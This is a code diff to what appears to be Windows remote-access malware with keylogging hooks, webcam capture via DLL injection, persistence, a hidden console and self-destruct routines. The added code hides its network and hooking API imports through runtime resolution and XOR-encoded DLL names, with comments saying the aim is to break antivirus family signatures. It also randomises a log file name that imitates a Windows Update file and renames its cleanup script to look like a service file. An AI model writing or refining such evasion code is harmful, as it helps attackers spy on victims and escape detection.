@@ -8,6 +8,7 @@
 
 #include <windows.h>
 #define INITGUID
+// winhttp.h for types/constants only — APIs resolved at runtime (no static IAT)
 #include <winhttp.h>
 #include <string>
 #include <vector>
@@ -24,6 +25,97 @@
 #include <tlhelp32.h>
 #include <shlobj.h>          // IShellLinkW for startup-folder .lnk creation
 #include "capture_shared.h"  // shared struct for DLL-injection webcam capture
+
+// === Dynamic API resolution (breaks static IAT family signatures) ==============
+// WinHTTP + hook + mutex resolved via GetProcAddress. Call sites keep the same
+// names via macros after InitDynamicApis().
+
+typedef HINTERNET (WINAPI *fn_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef BOOL (WINAPI *fn_WinHttpSetTimeouts)(HINTERNET, int, int, int, int);
+typedef HINTERNET (WINAPI *fn_WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+typedef HINTERNET (WINAPI *fn_WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
+typedef BOOL (WINAPI *fn_WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+typedef BOOL (WINAPI *fn_WinHttpReceiveResponse)(HINTERNET, LPVOID);
+typedef BOOL (WINAPI *fn_WinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
+typedef BOOL (WINAPI *fn_WinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
+typedef BOOL (WINAPI *fn_WinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL (WINAPI *fn_WinHttpCloseHandle)(HINTERNET);
+typedef HHOOK (WINAPI *fn_SetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef BOOL (WINAPI *fn_UnhookWindowsHookEx)(HHOOK);
+typedef HANDLE (WINAPI *fn_CreateMutexW)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
+
+static fn_WinHttpOpen              pWinHttpOpen = NULL;
+static fn_WinHttpSetTimeouts       pWinHttpSetTimeouts = NULL;
+static fn_WinHttpConnect           pWinHttpConnect = NULL;
+static fn_WinHttpOpenRequest       pWinHttpOpenRequest = NULL;
+static fn_WinHttpSendRequest       pWinHttpSendRequest = NULL;
+static fn_WinHttpReceiveResponse   pWinHttpReceiveResponse = NULL;
+static fn_WinHttpQueryHeaders      pWinHttpQueryHeaders = NULL;
+static fn_WinHttpQueryDataAvailable pWinHttpQueryDataAvailable = NULL;
+static fn_WinHttpReadData          pWinHttpReadData = NULL;
+static fn_WinHttpCloseHandle       pWinHttpCloseHandle = NULL;
+static fn_SetWindowsHookExW        pSetWindowsHookExW = NULL;
+static fn_UnhookWindowsHookEx      pUnhookWindowsHookEx = NULL;
+static fn_CreateMutexW             pCreateMutexW = NULL;
+static bool g_dynApisReady = false;
+
+// Stack-built module/export names (avoid plain "winhttp.dll" / API strings in .rdata)
+static void DynName(char* out, const char* enc, size_t n, unsigned char k) {
+    for (size_t i = 0; i < n; i++) out[i] = (char)(enc[i] ^ k);
+    out[n] = 0;
+}
+
+static bool InitDynamicApis() {
+    if (g_dynApisReady) return true;
+    // "winhttp.dll" xor 0x5A
+    static const unsigned char eWh[] = {0x2d,0x33,0x34,0x32,0x2e,0x2e,0x2a,0x74,0x3e,0x36,0x36};
+    char wh[16]; DynName(wh, (const char*)eWh, 11, 0x5A);
+    HMODULE hWh = LoadLibraryA(wh);
+    if (!hWh) return false;
+
+    // Export names via GetProcAddress (IAT has LoadLibrary/GetProcAddress only for winhttp)
+    pWinHttpOpen = (fn_WinHttpOpen)GetProcAddress(hWh, "WinHttpOpen");
+    pWinHttpSetTimeouts = (fn_WinHttpSetTimeouts)GetProcAddress(hWh, "WinHttpSetTimeouts");
+    pWinHttpConnect = (fn_WinHttpConnect)GetProcAddress(hWh, "WinHttpConnect");
+    pWinHttpOpenRequest = (fn_WinHttpOpenRequest)GetProcAddress(hWh, "WinHttpOpenRequest");
+    pWinHttpSendRequest = (fn_WinHttpSendRequest)GetProcAddress(hWh, "WinHttpSendRequest");
+    pWinHttpReceiveResponse = (fn_WinHttpReceiveResponse)GetProcAddress(hWh, "WinHttpReceiveResponse");
+    pWinHttpQueryHeaders = (fn_WinHttpQueryHeaders)GetProcAddress(hWh, "WinHttpQueryHeaders");
+    pWinHttpQueryDataAvailable = (fn_WinHttpQueryDataAvailable)GetProcAddress(hWh, "WinHttpQueryDataAvailable");
+    pWinHttpReadData = (fn_WinHttpReadData)GetProcAddress(hWh, "WinHttpReadData");
+    pWinHttpCloseHandle = (fn_WinHttpCloseHandle)GetProcAddress(hWh, "WinHttpCloseHandle");
+
+    HMODULE hU32 = GetModuleHandleA("user32.dll");
+    if (!hU32) hU32 = LoadLibraryA("user32.dll");
+    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    if (hU32) {
+        pSetWindowsHookExW = (fn_SetWindowsHookExW)GetProcAddress(hU32, "SetWindowsHookExW");
+        pUnhookWindowsHookEx = (fn_UnhookWindowsHookEx)GetProcAddress(hU32, "UnhookWindowsHookEx");
+    }
+    if (hK32)
+        pCreateMutexW = (fn_CreateMutexW)GetProcAddress(hK32, "CreateMutexW");
+
+    g_dynApisReady = pWinHttpOpen && pWinHttpConnect && pWinHttpOpenRequest &&
+        pWinHttpSendRequest && pWinHttpReceiveResponse && pWinHttpCloseHandle &&
+        pWinHttpQueryDataAvailable && pWinHttpReadData && pWinHttpSetTimeouts &&
+        pWinHttpQueryHeaders && pSetWindowsHookExW && pUnhookWindowsHookEx && pCreateMutexW;
+    return g_dynApisReady;
+}
+
+// Redirect static names to dynamic pointers (after InitDynamicApis)
+#define WinHttpOpen              pWinHttpOpen
+#define WinHttpSetTimeouts       pWinHttpSetTimeouts
+#define WinHttpConnect           pWinHttpConnect
+#define WinHttpOpenRequest       pWinHttpOpenRequest
+#define WinHttpSendRequest       pWinHttpSendRequest
+#define WinHttpReceiveResponse   pWinHttpReceiveResponse
+#define WinHttpQueryHeaders      pWinHttpQueryHeaders
+#define WinHttpQueryDataAvailable pWinHttpQueryDataAvailable
+#define WinHttpReadData          pWinHttpReadData
+#define WinHttpCloseHandle       pWinHttpCloseHandle
+#define SetWindowsHookExW        pSetWindowsHookExW
+#define UnhookWindowsHookEx      pUnhookWindowsHookEx
+#define CreateMutexW             pCreateMutexW
 
 // Missing DirectShow declarations (not available in this mingw version)
 static const CLSID CLSID_SampleGrabber = {0xC1F400A0,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
@@ -509,12 +601,15 @@ static std::string GetKeyString(DWORD vk) {
     return "";
 }
 
-// Append a timestamped line to %TEMP%\wuaueng.log. Used for diagnostics only —
-// the log is wiped on self-destruct (CleanupPersistence + ScheduleSelfDestruct).
+// Append a timestamped line to %TEMP%\<per-build log>. Diagnostics only —
+// wiped on self-destruct (CleanupPersistence + ScheduleSelfDestruct).
+#ifndef AGENT_LOG_NAME
+#define AGENT_LOG_NAME "wuaueng.log"
+#endif
 static void LogMsg(const std::string& msg) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
-    std::string logPath = std::string(tmp) + "wuaueng.log";
+    std::string logPath = std::string(tmp) + AGENT_LOG_NAME;
     FILE* f = NULL;
     fopen_s(&f, logPath.c_str(), "a");
     if (f) {
@@ -785,8 +880,8 @@ static void ScheduleSelfDestruct() {
     if (!instExe.empty() && !PathEqualsI(std::string(selfPath), instExe))
         MoveFileExA(instExe.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
     DWORD pid = GetCurrentProcessId();
-    std::string logPath = std::string(tmp) + "wuaueng.log";
-    std::string batPath = std::string(tmp) + "NetpenCleanup.bat";
+    std::string logPath = std::string(tmp) + AGENT_LOG_NAME;
+    std::string batPath = std::string(tmp) + "svc_cleanup.bat";
     std::string bat =
         std::string("@echo off\r\n")
         + ":w\r\n"
@@ -1982,7 +2077,7 @@ static void CleanupPersistence() {
     GetTempPathA(MAX_PATH, tempPath);
     DeleteFileA((std::string(tempPath) + GetExeName()).c_str());
     DeleteFileA((std::string(tempPath) + "a.exe").c_str());
-    DeleteFileA((std::string(tempPath) + "wuaueng.log").c_str());
+    DeleteFileA((std::string(tempPath) + AGENT_LOG_NAME).c_str());
     std::string inst = GetInstallExePath();
     if (!inst.empty()) DeleteFileA(inst.c_str());
     // Clear stable install path marker
@@ -2266,6 +2361,7 @@ static int RunChild(HINSTANCE hInstance) {
 // only when no child is running. Version check every ~5 min. Update fail keeps us.
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
+    if (!InitDynamicApis()) return 1;
     InitConfig();
     HWND consoleWnd = GetConsoleWindow();
     if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);
